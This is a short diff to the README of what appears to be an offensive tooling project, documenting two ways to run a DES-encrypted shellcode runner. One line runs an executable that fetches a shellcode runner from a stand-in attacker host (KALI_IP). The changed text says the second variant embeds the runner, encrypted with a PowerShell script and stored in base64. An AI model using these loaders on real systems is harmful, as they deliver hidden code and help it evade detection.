@@ -57,7 +57,7 @@ cmd> des_decryptor.exe http://KALI_IP/<SHELLCODE_RUNNER>
 ```
 
 #### Method 2
-The executable embedds a shellcode runner. You can run it without providing any commands. 
+The executable embedds a shellcode runner, which first was ecrypted with ```TripleDESEncryptor.ps1``` and imported to ```payloads/des_decryptor_embeded.cs``` in base64 format. Doesn't need command-line arguments for the execution. 
 
 ```
 cmd> des_decryptor_embedded.exe
